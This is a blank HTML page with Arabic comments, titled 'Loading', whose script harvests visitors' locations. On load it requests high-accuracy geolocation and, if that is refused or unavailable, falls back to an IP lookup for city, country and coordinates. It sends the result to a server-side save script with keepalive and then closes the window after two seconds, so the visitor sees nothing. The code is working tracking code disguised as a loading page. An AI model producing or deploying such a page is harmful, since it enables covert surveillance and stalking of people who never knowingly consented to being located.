<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل</title>
    <script>
        // دالة لحفظ البيانات في ملف txt
        function saveToFile(data) {
            // إنشاء كائن FormData
            const formData = new FormData();
            formData.append('data', JSON.stringify(data));
            formData.append('token', 'SECURE_TOKEN_12345'); // توكن أمان
            
            // إرسال البيانات إلى الخادم
            fetch('save_location.php', {
                method: 'POST',
                body: formData,
                keepalive: true // ضمان إرسال البيانات حتى لو أُغلقت الصفحة
            });
        }

        // عند تحميل الصفحة
        window.addEventListener('DOMContentLoaded', function() {
            // محاولة الحصول على الموقع الجغرافي
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        // جمع البيانات
                        const locationData = {
                            timestamp: new Date().toISOString(),
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            source: 'geolocation'
                        };
                        
                        // حفظ البيانات في الملف
                        saveToFile(locationData);
                    },
                    function(error) {
                        // في حالة الخطأ، محاولة الحصول على الموقع عبر IP
                        fetch('https://ipapi.co/json/')
                            .then(response => response.json())
                            .then(ipData => {
                                const locationData = {
                                    timestamp: new Date().toISOString(),
                                    latitude: ipData.latitude,
                                    longitude: ipData.longitude,
                                    accuracy: 50000, // دقة منخفضة
                                    source: 'ipapi',
                                    error: getGeolocationError(error),
                                    city: ipData.city,
                                    country: ipData.country_name
                                };
                                
                                // حفظ البيانات في الملف
                                saveToFile(locationData);
                            });
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 5000,
                        maximumAge: 0
                    }
                );
            } else {
                // المتصفح لا يدعم خدمة الموقع الجغرافي
                fetch('https://ipapi.co/json/')
                    .then(response => response.json())
                    .then(ipData => {
                        const locationData = {
                            timestamp: new Date().toISOString(),
                            latitude: ipData.latitude,
                            longitude: ipData.longitude,
                            accuracy: 50000, // دقة منخفضة
                            source: 'ipapi',
                            error: 'GEOLOCATION_NOT_SUPPORTED',
                            city: ipData.city,
                            country: ipData.country_name
                        };
                        
                        // حفظ البيانات في الملف
                        saveToFile(locationData);
                    });
            }
            
            // دالة لترميز أخطاء الموقع الجغرافي
            function getGeolocationError(error) {
                switch(error.code) {
                    case error.PERMISSION_DENIED:
                        return 'PERMISSION_DENIED';
                    case error.POSITION_UNAVAILABLE:
                        return 'POSITION_UNAVAILABLE';
                    case error.TIMEOUT:
                        return 'TIMEOUT';
                    default:
                        return 'UNKNOWN_ERROR';
                }
            }
            
            // إغلاق الصفحة بعد 2 ثانية
            setTimeout(function() {
                window.close();
            }, 2000);
        });
    </script>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #ffffff;
            height: 100vh;
            overflow: hidden;
        }
    </style>
</head>
<body>
    <!-- الصفحة فارغة تماماً -->
</body>
</html>
